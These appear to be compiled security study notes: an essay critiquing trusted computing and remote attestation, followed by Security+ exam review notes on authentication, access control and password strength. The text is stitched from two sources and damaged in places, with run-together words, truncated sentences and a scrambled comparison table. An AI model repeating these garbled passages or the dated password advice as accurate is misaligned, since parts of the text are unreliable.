Thus, a PC with hardware support for these features can provide security guarantees that might be difficult to offer without hardware support.
Of course, flaws 缺陷 in software will still permit other attacks, including the disclosure of private information.
Trusted computing technology can't prevent computer security holes altogether.
In general, it seeks to contain and limit the damage that can result from a particular flaw.
  - For instance, it should not be possible for a coding flaw in one application (like a web browser) to be abused to copy or alter data from a different application (like a word processor).
  - This sort of isolation and containment approach is an important area of computer security research and is used in many different approaches to computer security, including promising techniques outside of trusted computing.
The trusted computing features just described will add new capabilities to the PC. To be used, they must be supported by software; in the absence of trusted computing software drivers, the trusted computing PC is just an ordinary PC, which remains capable of running all existing PC software.
To put this another way, the trusted computing architecture is designed to be backwards-compatible in supporting the ability to run existing operating systems and application software.
Microsoft also anticipates that future versions of Microsoft Windows (which could include NGSCB software) would be backwards compatible, able to run essentially all of today's DOS and Windows applications. In addition, the new PCs could run new trusted-computing-aware applications that take advantage of the new hardware features.
Misconceptions about trusted computing
The most common misconception denies that the trusted computing PCs would really be backwards-compatible or able to run existing software.
While it is certainly possible for manufacturers to build non-backwards- compatible PCs, or PCs incapable of running particular code, nothing in the TCG specifications insists on this.
Trusted computing architecture security model does not require that insecure, harmful, or undesirable software be prevented from running.
The security model instead concentrates on software isolation -- preventing running programs from interfering with one another.
When programs are adequately protected against interference by other programs, there is no security requirement that any particular software should be prevented from running.
Just as multi-user operating systems allow users to run the software of their choice while protecting other users from the effects of that software, NGSCB could allow users to run the software of their choice while protecting other software from its effects.
Only a particularly crude security model would require prohibiting "bad" software from a computer entirely, and the NGSCB model is not so crude.
In addition, that approach would require some means of determining which software is "bad", which would truly be a daunting task. (Some proprietary systems assume that all software not signed by a recognized authority is "bad", but users would properly reject this heavy-handed approach in the computer environment. They rightly insist on being able to write and use software without the prior approval of some authority.)
None of the hardware demanded by NGSCB appears to be specific to Microsoft Windows.
The TCPA/TCG hardware design is clearly not specific to any particular operating system.
IBM researchers have recently published software under the GNU GPL to make a TCPA TPM chip work with the Linux kernel. This software is usable today to improve the security of cryptographic key storage on Linuxbased systems running on hardware that supports TCPA.
Neither TCG nor NGSCB would itself inherently prevent users from using any particular operating system, program, or data file. And neither inherently requires or includes a mechanism to spy on users.
problem?
Trusted computing hardware provides security benefits.
But trusted computing has been received skeptically and remains controversial. Some of the controversy is based on misconceptions, but much of it is appropriate, since trusted computing systems fundamentally alter trust relationships.
Legitimate concerns about trusted computing are not limited to one area, such as consumer privacy or copyright issues.
We have at least two serious concerns about trusted computing.
First, existing designs are fundamentally flawed because they expose the public to new risks of anti-competitive and anti-consumer behavior.
Second, manufacturers of particular "trusted" computers and components may secretly implement them incorrectly.
Problem: Third-party uncertainty about your software environment is normally a feature, not a bug specifications, it could still be used in ways that harm computer owners. (Lucky Green, Ross Anderson)
Even as trusted computing architectures provide security benefits, they
may include features that can be abused 滥用, to the detriment of the customers who are asked to adopt the technology.
Chief among these features is remote attestation, which Microsoft describes as "break[ing] new ground in distributed computing" because no comparable feature exists in current computers.
Security design necessarily includes specifying a threat model:
what kinds of attacks and what kinds of attackers is a security measure meant to prevent against?
A security measure that prevents one attack may be completely ineffective against a different sort of attack; conversely, a security measure required for some purpose might be useless at best for those who do not share that goal.
Our most fundamental concern is that trusted computing systems are being deliberately designed to support threat models in which the owner of a "trusted" computer is considered a threat. These models are the exception rather than the rule in the history of computer and communications security, and they are not part of the rationales for trusted computing publicly offered by its proponents.
Attestation: appropriate for the purpose of preventing the software on a computer from being changed without the knowledge of the computer's owner (for instance, by a virus).
Unfortunately, the attestation model in TCG's current design can equally effectively prevent the software on a computer from being changed deliberately by the computer owner with his or her full knowledge and consent.   - While the owner is always free to alter software, attestation adds a new risk: doing so may now eliminate the computer's ability to interoperate with other computers.
Because third parties currently have no reliable way to tell what software you are using, they have no reliable way to compel you to use the software of their choice.
This aspect of the status quo is almost always a benefit for computer owners -- in terms of improved competition, software choice, software interoperability, and owners' ability to control their computers -- and therefore no attestation scheme that changes this situation is likely to be beneficial to consumers.
Examples of the problems with changing this part of the status quo appear below.
Examples of abuses of remote attestation
Examples of how TCG's attestation approach can harm interoperability or be used against computer owners.
1. On the Web
A web site could demand a software attestation from people wishing to read it.
If they declined to provide an attestation, the site would refuse to deal with them at all; if the attestation showed that they were using "unapproved" software, the site would likewise decline to interact with them.
Only those who could produce a digital certificate proving that their computers' software was satisfactory to the remote site would be permitted to use it. And this certificate could be produced -- in the current TCG scheme of things -- only if its contents were accurate.
Today, there is no really reliable way to achieve this effect.
Therefore, attempts to coerce users into using particular software are currently ineffective; web sites are hard-pressed to control what operating systems and applications their users can use.
Reverse engineering allows the creation of competitive new software that works well with existing software and services, and therefore computer owners have real choice. It is effectively impossible to punish them for choosing to use software other than that favored by those they deal with. If they want to use a different web browser or a different operating system, they know that they are unlikely to be locked out by the services most important to them.
For instance:
  - Some on-line banking services claim to "require" Microsoft's browser, but users of other software are readily able to instruct their browsers to impersonate Internet Explorer.
  - As far as the bank is concerned, its customers are accessing the site with the browser it demanded, but the users are not locked into technology decisions dictated by the shortsightedness of their financial institutions.
In a widely publicized case, MSN, the Microsoft Network, briefly refused to serve web pages to non-Microsoft browsers.
  - In the interim, users of competitive products were able to fool MSN into thinking they were running Microsoft browsers.
  - This would be impossible in an environment of routine NGSCB-style remote attestations. way, these attestations would let anyone with market power leverage that power to control our software choices.
Security has nothing to do with many sites' motivations for preventing the use of disfavored software. Indeed, their reasons may be entirely arbitrary. In some cases, a site operator wants to force you to use a particular program in order to subject you to advertising. By verifying your use of an "approved" client, the site can satisfy itself that you have been forced to view a certain number of advertisements.
2. Software interoperability and lock-in
Software interoperability is also at risk. A developer of a web server program, file server program, e-mail server program, etc., could program it to demand attestations; the server could categorically refuse to deal with clients that had been produced by someone other than the server program's publisher.
Or the publisher could insist on licensing fees from client developers, and make its server interoperate only with those who had paid the fee. (It is similarly possible to create proprietary encrypted file formats which can only be read by "approved" software, and for which the decryption keys must be obtained from a network server and are extremely difficult to recover by reverse engineering.)
The publisher in this case could greatly increase the switching costs for its users to adopt a rival's software. If a user has a large amount of important data stored inside a proprietary system, and the system communicates only with client software written by the proprietary system's publisher, it may be extremely difficult for the user to migrate his or her data into a new software system. When the new system tries to communicate with the old system in order to extract the data, the old system may refuse to respond.
The Samba file server is an important example of interoperable software created through reverse engineering. Samba developers studied the network protocol used by Microsoft Windows file servers and created an alternative implementation, which they then published as free/open source software. Samba can be deployed on a computer network in place of a Windows file server, and Windows client machines will communicate with it just as if it were a Windows server. (Similarly, Samba provides the means to allow non- Windows clients to access Windows file servers.) Without competitive software like Samba, users of Windows clients would be forced to use Windows servers, and vice versa. But if software could routinely identify the software at the other end of a network connection, a software developer could make programs demand attestations and then forbid any rival's software to connect or interoperate. If Microsoft chose to use NGSCB in this way, it could permanently lock Samba out of Windows file services, and prevent any useful competing implementations of the relevant protocols except by specific authorization.
Similarly, instant messaging (IM) services have frequently tried to lock out their competitors' clients and, in some cases, free/open source IM clients. Today, these services are typically unsuccessful in creating more than a temporary disruption for users. An attestation mechanism would be a powerful tool for limiting competition and interoperability in IM services. Some client applications could be permanently prevented from connecting at all, even though they offer features end-users prefer.
These are examples of a more general problem of "lock-in", often practiced as a deliberate business strategy in the software industry, to the detriment of business and home computer users alike. Unfortunately, the TCG design provides powerful new tools to enable lock-in. Attestation is responsible for this problem; sealed storage can exacerbate things by allowing the program that originally created a file to prevent any other program from reading it. Thus, both network protocols and file formats can be used to attack software interoperability.
3. DRM, tethering, forced upgrades, and forced downgrades
Many people have speculated that trusted computing technology is a way of bringing digital rights management (DRM) technology to the PC platform. Some portions of the trusted computing research agenda have roots in DRM, and Microsoft has announced a DRM technology (Microsoft Rights Management Services) that it says will make use of NGSCB.
However, trusted computing developers deny that DRM is the main focus of their efforts, and trusted computing is useful for many applications besides DRM.
Ultimately, DRM is just one of several uses of a technology like NGSCB -- but it illustrates the general problem that NGSCB's current approach to attestation tends to harm competition and computer owners' control.
The NGSCB design's elements can all be useful to implementers of DRM systems. Curtaining prevents information in decrypted form from being copied out of a DRM client's memory space, which prevents making an unrestricted clear copy. Secure output can prevent information displayed on the screen from being recorded, which prevents the use of "screen-scrapers" or device drivers that record information rather than displaying it. Sealed storage allows files to be stored encrypted on a hard drive in such a way that only the DRM client that created them will be able to make use of them. And remote attestation can prevent any program other than a publisher-approved DRM client from ever receiving a particular file in the first place.
Among these elements, remote attestation is the linchpin of DRM policy enforcement. If a remote system lacks reliable knowledge of your software environment, it can never have confidence that your software will enforce policies against you. (You might have replaced a restrictive DRM client with an ordinary client that does not restrict how you can use information.) Thus, even though other NGSCB features aid DRM implementations, only remote attestation enables DRM policies to be instituted in the first place, by preventing the substitution of less- restrictive software at the time the file is first acquired.
Other consumer-unfriendly software behaviors which can be implemented by means of attestation, combined with sealed storage, include tethering (preventing a program or a file from being migrated from one computer to another), forcing software upgrades or downgrades, and enabling some limited classes of "spyware" -- in this case, applications that phone home to describe how they are being used. (Some of these behaviors might be good things if they occur at a computer owner's behest, but not if they occur at a software publisher's or service provider's whim. example, you might want to prevent a sensitive file from being moved off your computer, but you wouldn't want other people to be able to prevent you from moving your own files around.) Although all these unfriendly behaviors can be implemented in software today, they can in principle be defeated by well-understood techniques such as running a program in an emulated environment, or altering it to remove the undesirable behavior. Remote attestation makes it possible for the first time for a program to obtain and communicate reliable evidence about whether it is running in an emulator or whether it has been altered.
More generally, attestation in the service of remote policy enforcement leads to a variety of mechanisms of "remote control" of software running on your computer. We emphasize that these remote control features are not a part of NGSCB, but NGSCB does enable their robust implementation by software programmers. Lucky Green provides the example of a program written to receive from some authority a "revocation list" of banned documents it is no longer permitted to display. This mechanism would have to have been implemented in the software when it was initially written (or it would have to be added through a forced upgrade). If such a restriction were implemented, however, it would be essentially impossible for the user to override. In that case, some authority could remotely revoke documents already resident on computers around the world; those computers would, despite the wishes of their owners, comply with the revocation policy. The enforcement of this policy, like others, against the computer owner is dependent on the remote attestation feature.
4. Computer owner as adversary?
The current version of remote attestation facilitates the enforcement of policies against the wishes of computer owners.
If the software you use is written with that goal in mind, the trusted computing architecture will not only protect data against intruders and viruses, but also against you. Owner are treated as an adversary.
This problem arises because of the attestation design's single-minded focus on accurately reflecting the computer's state in every situation -- making no exceptions.
A computer owner can disable attestation entirely, but not cause an attestation that does not reflect the current state of her PC -- you can't fool your bank about what browser you're using or to your other PC about what kind of Windows file sharing client you're running.
This approach benefits the computer owner only when the remote party to whom the attestation is given has the same interests as the owner. If you give an attestation to a service provider who wants to help you detect unauthorized modifications to your computer, attestation benefits you. If you're required to give an attestation to someone who aims to forbid you from using the software of your choice, attestation harms you.
A user-centered, pro-competitive approach to attestation features would give the owner the power to guarantee that attestation is never abused for a purpose of which the owner disapproves, maximizing computer owners' practical control over their computers in real- world network environments.
Some trusted computing developers insist that their existing approach to attestation is reasonable because giving an attestation is voluntary. In every situation, they argue, you can decline to give an attestation if you prefer not to present one. (Indeed, TCG's design allows you to turn the TCG TPM chip off entirely, or decide whether to present an attestation in a particular situation.) But as we've seen, attestation can be used to create barriers to interoperability and access, so users will face an enormous amount of pressure to present an attestation. It's economically unreasonable to assume that a technology will benefit people solely because they can decide whether to use it.
We are not saying that the ability to communicate information about a computer's software environment is undesirable. This capability might well be useful for some
security applications. We simply observe that the content of information about a computer's software environment should always be subject to the close control of that computer's owner. A computer owner -- not a third party -- should be able to decide, in her sole discretion, whether the information acquired by a third party will be accurate. This ensures that the attestation capability will not be used in a way contrary to the computer owner's interest.
A solution: Owner Override central problem with the current trusted computing proposals.
It is an unacceptably grave design flaw that must be remedied before the trusted computing architecture as a whole package will be of clear benefit to computer owners.
A simple measure we call Owner Override could fix the problem by restoring others' inability to know for certain what software you're running -- unless you decide you would be better off if they knew.
Owner Override subtly changes the nature of the security benefit provided by attestation.
Currently, attestation tells remote parties whether the software on your computer has been changed.
Attestation plus Owner Override would let remote parties know if the software on your computer has been changed without your knowledge.
  - Thus, detection of illicit activity would still be practical.
  - If, however, you had made deliberate changes on your own computer, you could conceal them, just as you can today, to prevent someone else from using your choices as a reason to discriminate against you.
Owner Override works by empowering a computer owner, when physically present at the computer in question, deliberately to choose to generate an attestation which does not reflect the actual state of the software environment -- to present the picture of her choice of her computer's operating system, application software or drivers.
Since such an attestation can only be generated by the computer owner's conscious choice, the value of attestation for detecting unauthorized changes is preserved.
But the PC owner has regained fine-grained control, even in a network environment, and the PC can no longer be expected to enforce policies against its owner.
Owner Override removes the toolbox that allows the trusted computing architecture to be abused for anti-interoperability and anti- competitive purposes.
It restores the important ability to reverse engineer computer programs to promote interoperability between them. B
roadly, it fixes trusted computing so that it protects the computer owner and authorized users against attacks, without limiting the computer owner's authority to decide precisely which policies should be enforced.
It does so without undermining any benefit claimed for the TCG architecture or showcased in Microsoft's public NGSCB demonstration. And it is consistent with TCG's and most vendors' statements about the goals of trusted computing.
(In a corporate setting, the corporation might be the owner of the computers its employees use, retaining the power to set network computing polices for its users. Since Owner Override requires users to provide owner credentials before defeating policies, it
does not impair a computer owner's control over authorized users. A corporation can, example, still use attestations to control what software employees can use on corporate desktop machines when they access corporate network resources.)
Owner Override does preclude some interesting new applications, particularly in distributed computing.
In the status quo, it's not typically possible to send data to an adversary's computer while controlling what the adversary can do with it.
Owner Override preserves that aspect of the status quo, to the regret of application developers who would like to be able to trust remote computers even while distrusting their owners. Similarly, Owner Override prevents trusted computing from being used to stop cheating in network games. Since Owner Override -- like trusted computing in general -- removes no existing features or functionality from the PC, we believe that its advantages significantly outweigh its disadvantages.
Despite the plausible desirability of hardware improvements to enhance computer security, not just any set of hardware changes will do. PC owners should think carefully about which direction they want their platform to develop. Trusted computing systems that protect your computer against you and prevent you from overriding policies are, on balance, a step backward. An Owner Override feature or its equivalent is a necessary fix to the design of trusted computing systems.
(This table shows how Owner Override preserves most security benefits of remote attestation while avoiding its risks.)
         Status Quo
    Attestation
   Attestion + Owner Override
     Pros
    Competition and interoperability are the norm
User control and choice are protected
Lock-in and remote control are difficult because computer owners have substantial control over all local software in all circumstances
    Compromise of software (e.g., by a virus) can be made detectable by a remote party, which can act on this information
Cheating in network games can be prevented, and distributed applications (Distributed.net, SETI@Home, etc.) can run on computers owned by untrustworthy parties without risking integrity of calculations or confidentiality of data
Organizations can more
   Compromise of software can still be made detectable by a remote party
An organization can more effectively enforce policies against its own members, so long as they are using computers owned by the organization
Computer owners retain substantial control over local software
Competition, interoperability, user control and choice are
 effectively enforce preserved policies against their own members             effectively enforce policies against their own members
"Paternalist" security policies that protect users from the consequences of certain of their own mistakes can be implemented
   preserved
     Cons
   There is no way in general to allow a remote party to detect whether, without the computer owner's knowledge, local software has been inappropriately modified
Cheating in network games cannot be prevented
Cheating by unscrupulous participants in distributed computing projects cannot be prevented
"Paternalist" security policies that protect users against their own mistakes are difficult to enforce
 Third parties can enforce policies against computer owner where traditionally these would not have been technologically enforceable, or would have been enforceable only with difficulty -- example:
DRM
application lock-in
migration and back-up
restrictions product activation product tethering forced upgrade forced downgrade Problem: Verification of implementations
How can computer owners know that their trusted computing hardware has been implemented according to its published specifications? (Ruediger Weiss)
This is an important problem for all cryptographic hardware.
But since most PCs have not previously contained any specialized cryptographic hardware, most PC users simply haven't had occasion to worry about this problem in the past.
While any hardware could contain back doors or undocumented features, cryptographic hardware is unique in that it has access to important secret information as well as opportunities to leak that information through undetectable convert channels (example, in attestation certificates).
Thus, it is important to assure that trusted computer hardware manufacturers implement the specifications correctly, without including undocumented features that would allow them or third parties to obtain unauthorized access to private information.
Conclusion
hardware enhancements might be one way to improve computer security.
But treating computer owners as adversaries is not progress in computer security.
The interoperability, competition, owner control, and similar problems inherent in the TCG and NCSCB approach are serious enough that we recommend against adoption of these trusted computing technologies until these problems have been addressed.
Fortunately, we believe these problems are not insurmountable, and we look forward to working with the industry to resolve them. ▪


## book sum
Chapter 1 Exam Topic Review
When preparing for the exam, make sure you understand these key concepts covered in this chapter.
Understanding Core Security Goals
Ausecasehelpsprofessionalsidentifyandclarifyrequirementsto achieve a goal.
Confidentiality ensures that data is only viewable by authorized users. Encryption is the best choice to provide confidentiality. Access controls also protect the confidentiality ofdata.
Steganography (hiding data inside other data) is one method of supporting obfuscation by making the hidden data harder to see.
Integrity provides assurances that data has not been modified, tampered with, or corrupted through unauthorized or unintended changes. Data can be
a message, a file, or data within a database. Hashing is a common method of ensuring integrity.
Non-repudiation prevents entities from denying they took an action. Digital signatures and audit logs provide non-repudiation. Digital signatures also provide integrity for files and email.
Availability ensures that data and services are available when needed. A common goal is to remove single points of failure. Methods used to increase
or maintain availability include fault tolerance, failover clusters, load balancing, backups, virtualization, HVAC systems, and generators.
Introducing Basic Risk Concepts
Risk is the possibility of a threat exploiting a vulnerability and resulting in a loss.
A threat is any circumstanceor event that has the potential to compromise 392

▪
confi integrity, or availability.
A vulnerability is a weakness. It can be a weakness in the hardware, software, configuration, or users operating the system.
Risk mitigation reduces risk by reducing the chances that a threat will exploit a vulnerability or by reducing the impact of the risk.
Security controls reduce risks. example, antivirus software is a security control that reduces the risk of virus infection.
Understanding Control Types
The three primary security control types are technical (implemented with technology), administrative (using administrative or management methods), and physical (controls physically touch).
A technical control is one that uses technology to reduce vulnerabilities. Encryption, antivirus software, IDSs, firewalls, and the principle of least privilege are technical controls.
Administrative controls are primarily administrative and include items such as risk and vulnerability assessments. Some administrative controls help ensure that day-to-day operations of an organization comply with their overall security plan. Some examples include security awareness and training, configuration management, and change management.
Preventive controls attempt to prevent security incidents. Examples include system hardening, user training, guards, change management, and account disablement policies.
Detective controls attempt to detect when a vulnerability has been exploited. Examples include log monitoring, trend analysis, security audits (such as a
periodic review of user rights), video surveillance systems, and motion detection systems.
Corrective controls attempt to reverse the impact of an incident or problem after it has occurred. Examples include intrusion prevention systems (IPSs),
         ▪


## backups, and system recovery plans.
Deterrentcontrolsattempttopreventincidentsbydiscouraging threats. Warning.
Compensating controls are alternative controls used when itisn’t feasible or possible to use the primary control.
Implementing Virtualization
Virtualization allows multiple servers to operate on a single physical host. They provide increased availability with various tools such as snapshots and easy restoration.
Type I hypervisors run directly on the system hardware.They are often called bare-metal hypervisors because they don’t need to run within an operating system.
Type II hypervisors run as software within a host operating system.
Container virtualization is a specialized version of a Type II hypervisor. It allows services or applications to run within their own isolated cells or
containers. Containers don’t have a full operating system but instead use the kernel of the host.
Snapshots capture the state of a VM at a moment in time. Administrators often take a snapshot before performing a risky operation. If necessary, they can revert the VM to the snapshot state.
VMsprawlcanoccurifpersonnelwithintheorganizationdon’t manage the VMs.
VM escape attacks allow an attacker to access the host system from the VM. The primary protection is to keep the host and guests up to date with current patches.
Using Command-Line Tools
You run command-line tools in the Command Prompt window (in Windows)
         ▪


## and the terminal (in Linux).
The ping command can be used to check connectivity; check name resolution; and verify that routers, firewalls, and intrusion prevention systems block ICMP.
The ipconfig command on Windows allows you to view the configuration of network interfaces.
Linux uses ifconfig and/or ip to view and manipulate the configuration of networkinterfaces.Youcanenablepromiscuousmode onaNICwithifconfig.
Netstat allows you to view statistics for TCP/IP protocols and view all active network connections. This can be useful if you suspect malware is causing a computer to connect with a remote computer.
Tracert lists the routers (also called hops) between two systems. It can be used to verify a path has not changed.
The arp command allows you to view and manipulate the ARP cache. This can be useful if you suspect a system’s ARP cache has been modified during an attack.
Chapter 2 Exam Topic Review
Exploring Authentication Concepts
Authentication allows entities to prove their identity by using credentials known to another entity.
Identification occurs when a user claims or professes an identity, such as with a username, an email address, a PIV card, or by using biometrics.
       ▪


##  Authentication occurs when an entity provides proof of an identity (such as a password). A second identity is the authenticator and it verifies the authentication.
Authorization provides access to resources based on a proven identity. Accounting methods track user activity and record the activity in logs. Five factors of authentication are:
Something you know, such as a username and password
- Something you have, such as a smart card, CAC, PIV, or token
- Something you are, using biometrics, such as fingerprints or retina scans
Somewhere you are, using geolocation, a computer name, or a MAC address Something you do, such as gestures on a touch screen
The something you know factor typically refers to a shared secret, such as a password or a PIN. This is the least secure form ofauthentication.
Passwords should be strong and changed often. Complex passwords include multiple character types. Strong passwords are complex and at least 14 characters long.
Administrators should verify a user’s identity before resetting the user’s password. When resetting passwords manually, administrators should configure them as temporary passwords that expire after the first use, requiring users to create a new password the first time they log on. Self- service password systems automate password recovery.
Password policies provide a technical means to ensure users employ secure password practices.
Passwordlengthspecifiestheminimumnumberofcharactersinthe password. Password complexity ensures passwords are complex and include at least
           ▪


## three of the four character types, such as special characters.
Password history remembers past passwords and prevents users from reusing passwords.
Minimum password age is used with password history to prevent users from changing their password repeatedly to get back to the original password.
Maximum password age or password expiration forces users to change their password periodically. When administrators reset user passwords, the password should expire upon first use.
Password policies should apply to any entity using a password. This includes user accounts and accounts used by services and applications. Applications
with internally created passwords should still adhere to the organization’s password policy.
Account lockout policies lock out an account after a user enters an incorrect password too many times.
Smart cards are credit card-sized cards that have embedded certificates used for authentication. They require a PKI to issue certificates.
Common Access Cards (CACs) and Personal Identity Verification (PIV) cards can be used as photo IDs and as smart cards (both identification and authentication).
Tokens (or key fobs) display numbers in an LCD. These numbers provide rolling, one-time use passwords and are synchronized with a server. USB
tokens include an embedded chip and a USB connection. Generically, these are called hardware tokens.
HOTP and TOTP are open source standards used to create one- time-use passwords. HOTP creates a one-time-use password that does not expire and TOTP creates a one- time password that expires after 30 seconds.
Biometric methods are the most difficult to falsify. Physical methods include voice and facial recognition, fingerprints, retina scans, iris scans, and palm
         ▪


## scans. Biometric methods can also be used for identification.
The false acceptance rate (FAR), or false match rate, identifies the percentage of times false acceptance occurs. The false rejection rate (FRR), or false
nonmatch rate, identifies the percentage of times false rejections occur. The crossover error rate (CER) indicates the quality of the biometric system. Lower CERs are better.
Single-factor authentication includes one or more authentication methods in the same factor, such as a PIN and a password. Dual-factor (or two-factor)
authentication uses two factors of authentication, such as a USB token and a PIN. Multifactor authentication uses two or more factors. Multifactor authentication is stronger than any form of single- factor authentication
Authentication methods using two or more methods in the same factor are single- factor authentication. example, a password and a PIN are both in the
something you know factor, so they only provide single-factor authentication.
Comparing Authentication Services
Kerberos is a network authentication protocol using tickets issued by a KDC or TGT server. If a ticket-granting ticket expires, the user might not be able
to access resources. Microsoft Active Directory domains and Unix realms use Kerberos for authentication.
LDAP specifies formats and methods to query directories. It provides a single point of management for objects, such as users and computers, in an Active Directory domain or Unix realm. The following is an example of an LDAP string: LDAP:// CN=Homer,CN=Users,DC=GetCertifiedGetAhead,DC=com
LDAP Secure (LDAPS) encrypts transmissions with SSL or TLS.
Single sign-on (SSO) allows users to authenticate with a single user account and access multiple resources on a network without authenticating again.
SSO can be used to provide central authentication with a federated database and use this authentication in an environment with different operating
       ▪


## systems (nonhomogeneous environment).
SAML is an XML-based standard used to exchange authentication and authorization information between different parties. SAML is used with web- based applications.
A federated identity links a user’s credentials from different networks or operating systems, but the federation treats it as one identity.
Shibboleth is an open source federated identity solution that includes Open SAML libraries.
OAuth and OpenID Connect are used by many web sites to streamlinethe authentication process for users. They allow users to log on to many web sites
with another account, such as one they’ve created with Google, Facebook, PayPal, Microsoft, or Twitter.
Managing Accounts
The principle of least privilege is a technical control that uses access controls. It specifies that individuals or processes are granted only the rights and permissions needed to perform assigned tasks or functions, but no more.
Users should not share accounts. It prevents effective identification, authentication, authorization, and accounting. Most organizations ensure the Guest account is disabled.
Account policies often require administrators to have two accounts (an administrator account and a standard user account) to prevent privilege escalation and other attacks.
An account disablement policy ensures that inactive accountsare disabled. Accounts for employees who either resign or are terminated should be
disabled as soon as possible. Configuring expiration dates on temporary accounts ensures they are disabled automatically.
Time restrictions can prevent users from logging on or accessing network resources during specific hours. Location-based policies prevent users from
         ▪


## logging on from certain locations.
Accounts should be recertified to verify they are still required. example, if the organization extends a contract, it’s a simple matter to recertify the account.
Administrators verify that the contract has been extended, change the expiration date, and enable the account.
Administrators routinely perform account maintenance. This is often done with scripts to automate the processes and includes deleting accounts that are no longer needed.
Credential management systems store and simplify the use of credentials for users. When users access web sites needing credentials, the system
automatically retrieves the stored credentials and submits them to the web site.
Comparing Access Control Models
The role-based access control (role-BAC) model uses roles to grant access by placing users into roles based on their assigned jobs, functions, or tasks.
A matrix matching job titles with required privileges is useful as a planning document when using role-BAC.
Group-based privileges are a form of role-BAC. Administrators create groups, add users to the groups, and then assign permissionsto the groups.
This simplifies administration because administrators do not have to assign permissions to users individually.
The rule-based access control (rule-BAC) model is based on a set of approved instructions, such as ACL rules in a firewall. Some rule- BAC
implementations use rules that trigger in response to an event, such as modifying ACLs after detecting an attack.
In the discretionary access control (DAC) model, every object has an owner. The owner has explicit access and establishes access for any other user.
Microsoft NTFS uses the DAC model, with every object having a discretionary access control list (DACL). The DACL identifies who has access and what access they are granted. A major flaw of the DAC model is its susceptibility to Trojan horses.
       ▪


##  Mandatory access control (MAC) uses security or sensitivity labels to identify objects (what you’ll secure) and subjects (users). It is often used when access needs to be restricted based on a need to know. The administrator establishes access based on predefined security labels. These labels are often defined with a lattice to specify the upper and lower security boundaries.
An attribute-based access control (ABAC) evaluates attributes and grants access based on the value of these attributes. It is used in many software defined networks (SDNs).
Exploring AuthenticationConcepts
Authentication proves an identity with some type of credentials, such as a username and password. example, identification occurs when users claim (or profess) their identity with identifiers such as usernames or email addresses. Users then prove their identity with authentication, such as with a password. In this context, a user’s credentials refer to both a claimed identity and an authentication mechanism.
At least two entities know the credentials. One entity, such as a user, presents the credentials. The other entity is the authenticator that verifies the credentials. example, Marge knows her username and password, and an authenticating server knows her username and password. Marge presents her credentials to the authenticating server, and the server authenticates her.
The importance of authentication cannot be understated. You can’t have any type of access control if you can’t identify a user. In other words, if everyone is anonymous, then everyone has the same access to all resources.
Also, authentication is not limited to users. Services, processes,
workstations, servers, and network devices all use authentication to prove their identities. Many computers use mutual authentication, where both parties authenticate to each other.
 Comparing Identification and AAA
Authentication, authorization, and accounting (AAA) work together with identification to provide a comprehensive access management system. If you understand identification (claiming an identity, such as with a username) and authentication (providing the identity, such as with a password), it’s easier to add in the other two elements of AAA—authorization and accounting.
If users can prove their identity, that doesn’t mean that they are automatically granted access to all resources within a system. Instead, users are granted authorization to access resources based on their proven identity. This can be as simple as granting a user permission to read data in a shared folder. Access control systems include multiple security controls to ensure that users can access resources they’re authorized to use, but no more.
Accounting methods track user activity and record the activity in logs. example, audit logs track activity and administrators use these to create an audit trail. An audit trail allows security professionals to re-create the events that preceded a security incident.
Effective access control starts with strong authentication mechanisms, such as the use of robust passwords, smart cards, or biometrics. If users can bypass the authentication process, the authorization and accounting processes are ineffective.
 Comparing Authentication Factors
Authentication is often simplified as types, or factors, of authentication. A use case of supporting authentication may require administrators to implement one factor of authentication for basic authentication, two factors for more secure authentication, or more factors for higher security. As an introduction, the factors are:
Something you know, such as a password or personalidentification number (PIN)
Something you have, such as a smart card or USB token Something you are, such as a fingerprint or other biometric identification
Somewhere you are, such as your location using geolocation technologies
Something you do, such as gestures on a touch screen
Something You Know
The something you know authentication factor typically refers to a shared secret, such as a password or even a PIN. This factor is the least
secure form of authentication. However, you can increase the security of a password by following some simple guidelines. The following sections provide more details on important password securityconcepts.
Password Complexity
One method used to make passwords more secure is to require them to be complex and strong. A strong password is of sufficient length, doesn’t include words found in a dictionary or any part of a user’s name, and combines at least three of the four following character types:
Uppercase characters (26 letters A–Z)
Lowercase characters (26 letters a–z)
Numbers (10 numbers 0–9)
Special characters (32 printable characters, such as !, $, and *)
A complex password uses multiple character types, such as Ab0@. However, a complex password isn’t necessarily strong. It also needs to be sufficiently long. It’s worth noting that recommendations for the best length of a strong password vary depending on the type of account. As of January 2016, Microsoft began recommending a best practice of setting the minimum password length to at least 14 characters. Organizations often require administrators
to create longer passwords. A key point is that longer passwords using more character types are more secure and short passwords of 4 or 5 characters are extremely weak.
The combination of different characters in a password makes up the key space, and you can calculate the key space with the following formula: C^N (CN). C is the number of possible characters used, and N is the length of the password. The ^ character in C^N indicates that C is raised to the N power. example, a 6-character password using only lowercase letters (26 letters) is calculated as 26^6 (266), or about 308 million possibilities. Change this to a 10- character password and the value is 26^10 (2610), or about 141 trillion possibilities. Although this looks like a high number of possibilities, there are password-cracking tools that can test more than 20 billion passwords per second on desktop computers with a high-end graphics processor. An attacker can crack a 10-character password using only lowercase characters
(141 trillion possibilities) in less than two hours.
However, if you use all 94 printable characters (uppercase, lowercase,
numbers, and special characters) with the same 6- and 10-character password lengths, the values change significantly: 94^6 (946) is about 689 billion possibilities, and 94^10 (9410) is about 53 quintillion. That’s 53 followed by 18 zeroes.
You probably don’t come across quintillion very often. The order is million, billion, trillion, quadrillion, and then quintillion. The password- cracking tool that cracks a lowercase password in two hours will take years to crack a 10-character password using all four character types.
Security experts often mention that if you make a password too complex, you make it less secure.
Read that again. It is not a typo. Morecomplexityequatestolesssecurity.Thisisbecauseusershave
problems remembering overly complex passwords such as 4%kiElNsB* and they are more likely to write them down. A password written on paper or stored inafileonauser’scomputersignificantlyreducessecurity.Instead, users are encouraged to use passphrases. Instead of nonsensical strings of characters, a passphrase is a long string of characters that has meaning to the user. A few examples of strong passphrases are IL0veSecurity+, IL0veThi$B00k, and IWi11P@$$. Note that these examples include all four
character types—uppercase letters, lowercase letters, one or more numbers, and one or more special characters. These passwords are also known as passphrases because they are a combination of words that are easier to remember than a nonsensical string
of characters such as 4*eiRS@<].
Strong passwords never include words that can be easily guessed, such as a user’s name, words in a dictionary (for any language), or common key combinations.
Training Users About Password Behaviors
Common user habits related to password behaviors have historically ignored security. Many users don’t understand the value of their password, or the potential damage if they give it out. It’s important for an organization to provide adequate training to users on password security if
  they use passwords within the organization. This includes both the creation of strong passwords and the importance of never giving out their passwords.
example, the password “123456” frequently appears on lists as the most common password in use. The users who are creating this password probably don’t know that it’s almost like using no password at all. Also, they probably don’t realize that they can significantly increase the password strength by using a simple passphrase such as “ICanCountTo6.” A little training can go a long way.
